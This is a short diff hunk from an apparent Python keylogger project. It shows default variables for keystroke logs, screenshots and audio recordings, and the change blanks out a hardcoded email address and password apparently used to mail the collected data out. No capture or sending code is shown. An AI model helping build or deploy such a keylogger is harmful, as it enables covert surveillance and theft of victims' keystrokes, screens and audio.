@@ -17,9 +17,9 @@ from PIL import ImageGrab
 #default variables
 k_info = "K_log.txt"
 k2_info ="K2_log.txt"
-email_addrss = "hikeylogger4m3@gmail.com"
-password = "keylogger123"
-toaddrss = "hikeylogger4m3@gmail.com"
+email_addrss = ""
+password = ""
+toaddrss = ""
 
 screenshot_information = "ss.png"
 audio = "audio.wav"
